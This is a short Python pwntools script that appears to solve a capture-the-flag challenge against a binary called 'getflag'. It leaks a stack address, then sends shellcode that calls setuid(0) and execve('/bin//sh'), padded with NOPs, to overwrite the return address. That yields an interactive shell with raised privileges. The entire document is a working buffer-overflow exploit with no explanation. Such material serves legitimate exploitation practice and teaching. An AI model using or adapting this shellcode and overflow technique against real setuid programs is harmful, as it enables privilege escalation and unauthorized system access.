#!/usr/bin/env python3

from pwn import *

binary = "./getflag"
elf = context.binary = ELF(binary)

p = process(binary)

p.recvuntil(b"Give the password at ")
addr = p.recv(14)
int_addr = int(addr.decode(), 16)
print(f"[+] Stack Address: {hex(int_addr)!r}")

shell_addr = int_addr - 20

shellcode = asm("""
xor     rdi, rdi
xor     rax, rax
mov     rax, 0x69
syscall

xor     rax, rax
push    rax
mov     rax, 0x68732f2f6e69622f

push    rax
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
mov     rax, 0x3b
syscall
""")

payload = b''
payload += shellcode
payload += asm("nop") * (56 - len(shellcode))

payload += p64(shell_addr)

p.sendlineafter(b"if you have the permission to see my secret...", payload)

p.interactive()
